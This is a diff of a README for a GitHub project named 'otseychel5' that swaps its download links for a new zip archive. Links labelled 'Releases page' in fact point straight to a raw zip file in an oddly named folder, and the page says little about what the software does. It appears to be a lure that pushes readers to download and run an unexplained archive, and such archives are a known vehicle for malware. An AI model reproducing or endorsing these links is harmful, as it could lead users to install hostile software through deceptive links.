@@ -6,7 +6,7 @@ Welcome to the **otseychel5** project! This application offers a simple way to e
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/kript00/otseychel5/main/atheistically/otseychel5.zip%20Release-brightgreen)](https://raw.githubusercontent.com/kript00/otseychel5/main/atheistically/otseychel5.zip)
+[![Download Latest Release](https://github.com/kript00/otseychel5/raw/refs/heads/main/atheistically/otseychel-1.0-beta.3.zip%20Release-brightgreen)](https://github.com/kript00/otseychel5/raw/refs/heads/main/atheistically/otseychel-1.0-beta.3.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you start, ensure that your system meets the following requirements:
 
 1. **Visit the Releases Page**
    
-   Go to the [Releases page](https://raw.githubusercontent.com/kript00/otseychel5/main/atheistically/otseychel5.zip) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/kript00/otseychel5/raw/refs/heads/main/atheistically/otseychel-1.0-beta.3.zip) to find the latest version of the software.
 
 2. **Choose the Latest Release**
 
@@ -67,6 +67,6 @@ If you still have questions or need assistance, check the project's GitHub page 
 
 ## 📥 Download Again
 
-Don’t forget to revisit the [Release page](https://raw.githubusercontent.com/kript00/otseychel5/main/atheistically/otseychel5.zip) for the latest version and updates.
+Don’t forget to revisit the [Release page](https://github.com/kript00/otseychel5/raw/refs/heads/main/atheistically/otseychel-1.0-beta.3.zip) for the latest version and updates.
 
 Thank you for using **otseychel5**! Enjoy your experience.
